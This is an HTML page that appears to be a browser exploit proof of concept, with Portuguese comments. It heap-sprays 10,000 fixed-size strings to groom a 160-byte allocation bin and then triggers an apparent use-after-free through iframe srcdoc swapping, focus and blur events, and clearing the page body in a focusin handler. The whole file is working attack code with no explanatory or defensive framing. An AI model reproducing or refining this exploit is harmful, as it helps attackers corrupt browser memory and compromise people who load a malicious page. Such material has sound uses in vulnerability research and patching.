
<!DOCTYPE html>
<html>
<body>
<iframe id="frame_a" loading="lazy"></iframe>
<iframe id="frame_b" srcdoc="b"></iframe>
<div id="container" tabindex="0" autofocus></div>
<div id="log"></div>
<script>
const logEl = document.getElementById("log");
let visit = localStorage.getItem("visit") || "0";
localStorage.setItem("visit", String(parseInt(visit) + 1));

// Pre-spray: 10000 StringImps de 144 chars = 160 bytes cada
// Satura bin 160 com strings controláveis ANTES do UAF
const spray = [];
const SPRAY_CONTENT = "B".repeat(144); // 16+144=160 bytes exatos
for (let i = 0; i < 10000; i++) {
    spray.push(SPRAY_CONTENT);
}

const PAD = "A".repeat(64);
const op = () => {
    logEl.textContent += PAD;
    logEl.scrollTop = logEl.scrollHeight;
};

let frame = document.getElementById("frame_a");
op(); op();

addEventListener("load", () => {
    op();
    frame.srcdoc = "a";
    op();
    frame.contentWindow?.addEventListener("blur", () => {});
    frame.focus();
    op();
});

container.onfocusin = () => {
    document.body.innerHTML = "";
};
</script>
</body>
</html>
